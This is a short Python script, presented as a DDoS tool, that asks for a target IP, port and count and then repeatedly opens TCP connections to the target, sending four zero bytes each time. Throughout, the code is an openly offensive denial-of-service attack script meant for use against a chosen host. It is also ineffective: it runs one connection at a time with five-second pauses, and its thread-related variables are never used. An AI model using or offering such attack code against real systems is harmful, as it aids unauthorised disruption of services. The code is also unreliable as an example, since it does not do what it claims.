import socket
from time import sleep

def DDOSing(ip, port):
    i = 0
    try:
        print("DDoSing ", ip, ":", port)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((ip, port))
        s.send(int(0).to_bytes(4, byteorder='big'))
        s.close()
        i += 1
    except Exception as e:
        print("Can't connect to the target")

print("Enter target ip: ")
ip = str(input())
# ip = '192.168.4.2'
print("Enter target port: ")
port = int(input())
print("how many times DDOS?: ")
threads_num =  int(input())

t_list = []
for i in range(threads_num):
    DDOSing(ip, port)
    sleep(5)
